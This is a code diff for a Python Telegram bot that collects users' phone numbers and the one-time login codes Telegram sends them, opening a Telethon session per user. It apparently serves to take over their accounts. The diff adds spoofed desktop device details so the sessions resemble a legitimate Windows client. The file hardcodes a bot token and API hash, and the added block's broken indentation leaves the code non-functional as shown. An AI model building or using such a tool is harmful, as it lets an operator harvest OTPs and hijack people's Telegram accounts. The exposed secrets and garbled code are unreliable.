@@ -16,6 +16,10 @@ BOT_TOKEN = "8038156264:AAE6y8_i6hqcW849lmVtSahLplcxQTfCDos"
 # Telethon API credentials
 API_ID = 2040
 API_HASH = 'b18441a1ff607e10a989891a5462e627'
+device_model = "Desktop"
+system_version = "Windows 10"
+app_version = "5.5.5 x64"
+lang_code = "en"
 
 # Create an instance of the Telegram Client for the bot
 application = Application.builder().token(BOT_TOKEN).build()
@@ -86,10 +90,18 @@ async def handle_message(update: Update, context: CallbackContext) -> None:
         user_data[user_id] = {'phone': text, 'otp': None}
         await update.message.reply_text(f'OTP has been sent to {text}. Please reply with the OTP or type "Stop" to end the process.')
 
-        # Create and start the Telethon client
-        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
-        user_data[user_id]['client'] = client
-        await client.connect()
+client = TelegramClient(
+    f'session_{user_id}', 
+    API_ID, 
+    API_HASH,
+    device_model=device_model,        # Custom device model from JSON
+    system_version=system_version,    # Custom system version from JSON
+    app_version=app_version,          # Custom app version from JSON
+    lang_code=lang_code               # Language code from JSON
+)
+
+user_data[user_id]['client'] = client
+await client.connect()
         
         # Send OTP request
         try:
